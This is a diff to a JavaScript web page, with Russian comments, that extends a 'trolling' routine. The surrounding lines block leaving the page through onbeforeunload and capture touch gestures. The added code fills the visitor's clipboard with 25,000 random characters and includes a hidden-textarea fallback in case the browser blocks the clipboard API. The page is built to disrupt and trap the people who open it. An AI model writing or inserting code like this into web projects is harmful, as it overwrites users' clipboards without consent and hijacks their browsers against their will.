@@ -145,6 +145,27 @@ window.onbeforeunload = function() { return "!"; };
         if (isTrolling) return;
         isTrolling = true;
 
+                    // Генерация 25 000 случайных символов
+const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+';
+let randomString = '';
+for (let i = 0; i < 25000; i++) {
+    randomString += characters.charAt(Math.floor(Math.random() * characters.length));
+}
+
+// Копирование в буфер обмена
+navigator.clipboard.writeText(randomString).then(() => {
+    console.log('Буфер забит на 25к символов');
+}).catch(err => {
+    // Если браузер заблокирует автоматическое копирование
+    const textArea = document.createElement("textarea");
+    textArea.value = randomString;
+    document.body.appendChild(textArea);
+    textArea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textArea);
+});
+                    
+
         // 1. Мгновенная блокировка жестов (теперь через захват всех фаз касания)
         const fastFull = (e) => { 
             if(isTrolling) {
